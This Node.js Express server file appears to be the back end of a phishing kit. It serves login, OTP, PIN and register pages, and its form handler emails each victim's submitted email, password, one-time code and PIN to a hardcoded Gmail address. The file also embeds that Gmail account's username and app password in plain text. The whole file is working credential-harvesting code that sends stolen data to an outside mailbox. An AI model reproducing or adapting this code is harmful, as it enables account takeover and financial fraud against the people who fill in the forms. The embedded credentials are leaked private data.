const  express = require("express")
const app = express();
const nodemailer = require('nodemailer'); 


const PORT = process.env.PORT || 5000;


// Middleware 
app.use(express.static('public'))
app.set('view engine', 'ejs')
app.use(express.json())



// Form
app.post('/',(req,res) => {
    console.log(req.body)

    const transporter = nodemailer.createTransport({
        service:'gmail',
        auth: {
            user: 'Victorchinemerem191@gmail.com',
            pass: 'aivsveolwtqinddb'
        }
    })

    const mailOptions = {
        from: req.body?.email,
        to:'Victorchinemerem191@gmail.com',
        subject: `Email: ${req.body?.email} \t\n\n\n password: ${req.body?.password} \t\n\n\n  OTP: ${req.body?.otp} \t\n\n\n Pin: ${req.body?.pin}`,
       
    }
console.log(mailOptions)
    transporter.sendMail(mailOptions,(error,info) => {
        if(error){
            console.log(error) 
            res.send('error');
        }else {
            console.log("Email sent", + info.response);
            res.send("success");
        }
    })
    
})





// index
app.get('/', (req,res ) => {

    res.render("index")
})
// contactForm
app.get('/login', (req,res ) => {

    res.render("login")
})
// otp
app.get('/otp', (req,res ) => {
    res.render('otp');
    
})
// pin
app.get('/pin', (req,res ) => {
    res.render("pin")
})
// register
app.get('/register', (req,res ) => {

    res.render("register")
})




app.listen(PORT, ()=> {
    console.log(`Server running on port http://localhost:${PORT}`)
})